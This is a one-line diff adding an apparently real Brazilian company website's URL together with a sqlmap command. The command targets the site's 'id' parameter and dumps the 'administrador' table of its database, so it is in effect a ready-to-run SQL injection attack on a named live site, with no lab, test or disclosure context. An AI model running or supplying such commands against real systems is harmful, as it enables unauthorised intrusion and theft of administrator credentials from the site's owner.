@@ -1,0 +1,1 @@
+https://www.digitalprodutora.com.br/portfolio.php?id=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.digitalprodutora.com.br/portfolio.php?id=1 -D digitalprodutora -T administrador --dump
